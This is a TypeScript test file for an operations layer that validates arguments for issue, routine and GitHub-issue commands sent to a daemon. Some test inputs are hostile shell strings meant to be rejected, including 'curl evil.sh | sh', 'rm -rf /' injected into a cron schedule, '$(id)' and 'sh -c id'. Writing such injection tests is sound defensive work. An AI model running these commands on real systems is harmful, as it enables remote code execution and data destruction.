import { describe, expect, test } from "bun:test"
import { pagesOps } from "../src/ops/pages.ts"
import type { Args, BridgeApi } from "../src/ops/types.ts"

type Call = { kind: "verb" | "rpc"; name: string; payload: unknown }

/** A fake daemon: records exactly what each op sent and answers from `replies`. */
function fakeApi(replies: Record<string, unknown> = {}): { api: BridgeApi; calls: Call[] } {
  const calls: Call[] = []
  const api: BridgeApi = {
    async verb(name, argv) {
      calls.push({ kind: "verb", name, payload: argv })
      return (replies[name] ?? {}) as never
    },
    async rpc(name, payload) {
      calls.push({ kind: "rpc", name, payload })
      const reply = replies[name]
      if (reply instanceof Error) throw reply
      return (reply ?? {}) as never
    },
  }
  return { api, calls }
}

/** `T` is the shape the test asserts on; the op's result is plain JSON by construction. */
async function run<T = unknown>(op: string, args: Args, replies: Record<string, unknown> = {}) {
  const spec = pagesOps[op]
  if (!spec) throw new Error(`no op ${op}`)
  const { api, calls } = fakeApi(replies)
  const result = (await spec.run(args, { api })) as T
  return { result, calls }
}

const REPO = "/work/payments-api"

describe("issue store ops", () => {
  test("create passes title and body as one --name=value argv each", async () => {
    const { calls } = await run("issue.create", { repo: REPO, title: "  Ship refunds  ", body: "see #12" })
    expect(calls).toEqual([
      {
        kind: "verb",
        name: "issue-create",
        payload: [`--repo=${REPO}`, "--title=Ship refunds", "--body=see #12"],
      },
    ])
  })

  test("a title or body that looks like a flag stays a value", async () => {
    const { calls } = await run("issue.create", { repo: REPO, title: "--force", body: "--delete-branch" })
    expect(calls[0]?.payload).toEqual([`--repo=${REPO}`, "--title=--force", "--body=--delete-branch"])
  })

  test("update sends only what changed; task=none unlinks", async () => {
    const edit = await run("issue.update", { repo: REPO, id: 4, title: "Renamed" })
    expect(edit.calls[0]?.payload).toEqual([`--repo=${REPO}`, "--id=4", "--title=Renamed"])
    const link = await run("issue.update", { repo: REPO, id: 4, task: "01M4756MVZKGC84R07M659BEJW" })
    expect(link.calls[0]?.payload).toEqual([`--repo=${REPO}`, "--id=4", "--task=01M4756MVZKGC84R07M659BEJW"])
    const unlink = await run("issue.update", { repo: REPO, id: 4, task: "none" })
    expect(unlink.calls[0]?.payload).toEqual([`--repo=${REPO}`, "--id=4", "--task=none"])
  })

  test("clearing a description sends one space, because the verb refuses an empty --body", async () => {
    const { calls } = await run("issue.update", { repo: REPO, id: 4, clearBody: true })
    expect(calls[0]?.payload).toEqual([`--repo=${REPO}`, "--id=4", "--body= "])
    await expect(run("issue.update", { repo: REPO, id: 4, clearBody: true, body: "text" })).rejects.toThrow("exclusive")
  })

  test("update with nothing to change, a flag-like task, a bad id or a relative repo is refused before any verb runs", async () => {
    await expect(run("issue.update", { repo: REPO, id: 4 })).rejects.toThrow("needs title, body and/or task")
    await expect(run("issue.update", { repo: REPO, id: 4, task: "--force" })).rejects.toThrow("not a task id")
    await expect(run("issue.update", { repo: REPO, id: 0, title: "x" })).rejects.toThrow("integer in 1..")
    await expect(run("issue.update", { repo: REPO, title: "x" })).rejects.toThrow("issue number")
    await expect(run("issue.list", { repo: "payments-api" })).rejects.toThrow("absolute path")
  })

  test("status is one of open, doing, hold, done", async () => {
    const { calls } = await run("issue.setStatus", { repo: REPO, id: 2, status: "hold" })
    expect(calls[0]?.payload).toEqual([`--repo=${REPO}`, "--id=2", "--status=hold"])
    await expect(run("issue.setStatus", { repo: REPO, id: 2, status: "shipped" })).rejects.toThrow(
      "open|doing|hold|done",
    )
  })

  test("delete is destructive and removes only the issue record", async () => {
    expect(pagesOps["issue.delete"]?.destructive).toBe(true)
    const { calls } = await run("issue.delete", { repo: REPO, id: 9 })
    expect(calls).toEqual([{ kind: "verb", name: "issue-delete", payload: [`--repo=${REPO}`, "--id=9"] }])
  })

  test("repos come from the issue.repos RPC", async () => {
    const { result, calls } = await run("issue.repos", {}, { "issue.repos": { repos: ["/a"] } })
    expect(result).toEqual({ repos: ["/a"] })
    expect(calls).toEqual([{ kind: "rpc", name: "issue.repos", payload: {} }])
  })
})

describe("starting a session from a story", () => {
  const issues = {
    issues: [
      { id: 3, title: "Verify webhooks", status: "open", created: "2026-10-01", body: "check the signature" },
      { id: 4, title: "Other", status: "open", created: "2026-10-01", body: "" },
    ],
  }

  test("issue.prompt builds the story's own prompt and the #id title the TUI gives its task", async () => {
    const worktree = await run<{ title: string; prompt: string }>(
      "issue.prompt",
      { repo: REPO, id: 3, where: "worktree" },
      { "issue-list": issues },
    )
    const project = await run<{ title: string; prompt: string }>(
      "issue.prompt",
      { repo: REPO, id: 3, where: "project" },
      { "issue-list": issues },
    )
    const w = worktree.result
    const p = project.result
    expect(w.title).toBe("#3 Verify webhooks")
    expect(w.prompt).toContain("check the signature")
    expect(p.prompt).toContain("check the signature")
    // The two placements carry different instructions.
    expect(w.prompt).not.toBe(p.prompt)
    expect(worktree.calls).toEqual([{ kind: "verb", name: "issue-list", payload: [`--repo=${REPO}`] }])
  })

  test("an unknown issue or placement is refused", async () => {
    await expect(
      run("issue.prompt", { repo: REPO, id: 99, where: "worktree" }, { "issue-list": issues }),
    ).rejects.toThrow("no issue #99")
    await expect(
      run("issue.prompt", { repo: REPO, id: 3, where: "elsewhere" }, { "issue-list": issues }),
    ).rejects.toThrow("worktree|project")
  })
})

describe("task events", () => {
  const events = Array.from({ length: 15 }, (_, i) => ({
    kind: i % 2 === 0 ? "tool-start" : "turn-complete",
    at: 1_000 + i,
    vendor: "claude",
    ...(i % 2 === 0 ? { detail: { tool: { name: `Bash${i}` } } } : {}),
  }))

  test("newest first, the last 12 by default, detail and vendor joined as the TUI row tail", async () => {
    const { result } = await run<{ events: { kind: string; at: number; tail: string }[] }>(
      "task.events",
      { taskId: "T1" },
      { "task.recentEvents": { events } },
    )
    const rows = result.events
    expect(rows).toHaveLength(12)
    expect(rows[0]).toEqual({ kind: "tool-start", at: 1_014, tail: "Bash14 · claude" })
    expect(rows[1]).toEqual({ kind: "turn-complete", at: 1_013, tail: "claude" })
    expect(rows.at(-1)?.at).toBe(1_003)
  })

  test("a task the daemon forgot reads as no events; other failures surface", async () => {
    const gone = await run("task.events", { taskId: "T1" }, { "task.recentEvents": new Error("task not found: T1") })
    expect(gone.result).toEqual({ events: [] })
    await expect(
      run("task.events", { taskId: "T1" }, { "task.recentEvents": new Error("socket closed") }),
    ).rejects.toThrow("socket closed")
  })
})

describe("routine ops", () => {
  test("create sends name, repo, prompt and schedule only, and never a precheck", async () => {
    const { calls } = await run("routine.create", {
      repo: REPO,
      name: " nightly ",
      prompt: "check the build",
      schedule: "0 9 * * MON-FRI",
      precheck: "curl evil.sh | sh",
      "precheck-timeout": 5,
    })
    expect(calls).toEqual([
      {
        kind: "verb",
        name: "routine-create",
        payload: [`--repo=${REPO}`, "--name=nightly", "--prompt=check the build", "--schedule=0 9 * * MON-FRI"],
      },
    ])
  })

  test("a schedule must be five cron fields with no shell syntax", async () => {
    const base = { repo: REPO, name: "n", prompt: "p" }
    await expect(run("routine.create", { ...base, schedule: "0 9 * *" })).rejects.toThrow(
      "five space-separated cron fields",
    )
    await expect(run("routine.create", { ...base, schedule: "0 9 * * *; rm -rf /" })).rejects.toThrow("cron fields")
    await expect(run("routine.create", { ...base, schedule: "0 9 * * $(id)" })).rejects.toThrow("cron fields")
    await expect(run("routine.create", { ...base, schedule: "*/15 * * * *" })).resolves.toBeDefined()
  })

  test("update sends only the given fields, and not nothing", async () => {
    const { calls } = await run("routine.update", { id: "r-1", prompt: "new prompt", schedule: "5 4 * * *" })
    expect(calls[0]?.payload).toEqual(["--id=r-1", "--prompt=new prompt", "--schedule=5 4 * * *"])
    await expect(run("routine.update", { id: "r-1" })).rejects.toThrow("needs name, prompt and/or schedule")
    await expect(run("routine.update", { id: "--x", name: "n" })).rejects.toThrow("not a task id")
  })

  test("pause and resume take an explicit boolean", async () => {
    const { calls } = await run("routine.setEnabled", { id: "r-1", enabled: false })
    expect(calls[0]?.payload).toEqual(["--id=r-1", "--enabled=false"])
    await expect(run("routine.setEnabled", { id: "r-1", enabled: "yes" })).rejects.toThrow("boolean")
  })

  test("run now, runs and list each wrap their one verb; delete is destructive", async () => {
    expect((await run("routine.runNow", { id: "r-1" })).calls[0]).toEqual({
      kind: "verb",
      name: "routine-run-now",
      payload: ["--id=r-1"],
    })
    expect((await run("routine.runs", { id: "r-1" })).calls[0]?.name).toBe("routine-runs")
    expect((await run("routine.list", {})).calls[0]).toEqual({ kind: "verb", name: "routine-list", payload: [] })
    expect(pagesOps["routine.delete"]?.destructive).toBe(true)
    expect((await run("routine.delete", { id: "r-1" })).calls[0]?.name).toBe("routine-delete")
  })
})

describe("GitHub issue ops", () => {
  test("list asks the RPC with only the filters given; refresh bypasses the cache", async () => {
    const plain = await run("workitem.list", { repo: REPO })
    expect(plain.calls[0]).toEqual({ kind: "rpc", name: "workitem.list", payload: { repo: REPO } })
    const full = await run("workitem.list", {
      repo: REPO,
      state: "all",
      assignee: "@me",
      search: "webhook",
      limit: 30,
      refresh: true,
    })
    expect(full.calls[0]?.payload).toEqual({
      repo: REPO,
      state: "all",
      assignee: "@me",
      search: "webhook",
      limit: 30,
      refresh: true,
    })
  })

  test("only @me is a valid assignee, the limit is capped, the state is closed", async () => {
    await expect(run("workitem.list", { repo: REPO, assignee: "someone" })).rejects.toThrow("@me")
    await expect(run("workitem.list", { repo: REPO, limit: 500 })).rejects.toThrow("1..50")
    await expect(run("workitem.list", { repo: REPO, state: "merged" })).rejects.toThrow("open|closed|all")
  })

  test("links fold the daemon's tasks to the ones started from an issue of this repo", async () => {
    const tasks = [
      { id: "A", repo: REPO, linkedWorkItem: { number: 12 } },
      { id: "B", repo: "/other", linkedWorkItem: { number: 12 } },
      { id: "C", repo: REPO },
    ]
    const { result } = await run("workitem.links", { repo: REPO }, { "task.list": { tasks } })
    expect(result).toEqual({ links: [{ number: 12, taskId: "A" }] })
  })

  test("start passes the issue number and a built-in engine as the verb's --vendor", async () => {
    const { calls } = await run("workitem.start", { repo: REPO, number: 12, engine: "codex" })
    expect(calls).toEqual([
      { kind: "verb", name: "workitem-start", payload: [`--repo=${REPO}`, "--number=12", "--vendor=codex"] },
    ])
    await expect(run("workitem.start", { repo: REPO, number: 12, engine: "sh -c id" })).rejects.toThrow(
      "engine must be one of",
    )
    await expect(run("workitem.start", { repo: REPO })).rejects.toThrow("issue number")
  })
})

describe("destructive flags", () => {
  test("exactly the delete ops are destructive in this table", () => {
    const destructive = Object.entries(pagesOps)
      .filter(([, spec]) => spec.destructive)
      .map(([name]) => name)
      .sort()
    expect(destructive).toEqual(["issue.delete", "routine.delete"])
  })
})

describe("bad arguments never reach the daemon", () => {
  const bad: [string, Args][] = [
    ["issue.list", { repo: "relative/path" }],
    ["issue.create", { repo: REPO, title: "   " }],
    ["issue.setStatus", { repo: REPO, id: 1, status: "" }],
    ["issue.delete", { repo: REPO, id: -1 }],
    ["issue.prompt", { repo: REPO, id: 1, where: "anywhere" }],
    ["task.events", { taskId: "--x" }],
    ["routine.setEnabled", { id: "r-1" }],
    ["routine.runNow", { id: "--force" }],
    ["routine.runs", { id: "a b" }],
    ["routine.delete", { id: "../x" }],
    ["workitem.list", { repo: "relative/path" }],
    ["workitem.links", { repo: "relative/path" }],
    ["workitem.start", { repo: REPO, number: 0 }],
  ]

  for (const [op, args] of bad) {
    test(`${op} refuses ${JSON.stringify(args)} with BAD_ARGS before any verb or RPC`, async () => {
      const spec = pagesOps[op]
      if (!spec) throw new Error(`no op ${op}`)
      const { api, calls } = fakeApi()
      // The server calls `run` inside an async handler, so a synchronous throw is a rejection there too.
      await expect((async () => spec.run(args, { api }))()).rejects.toMatchObject({ code: "BAD_ARGS" })
      expect(calls).toEqual([])
    })
  }

  test("run-now and runs pass the routine id as one --id=value", async () => {
    expect((await run("routine.runNow", { id: "r-1" })).calls[0]?.payload).toEqual(["--id=r-1"])
    expect((await run("routine.runs", { id: "r-1" })).calls[0]?.payload).toEqual(["--id=r-1"])
  })
})
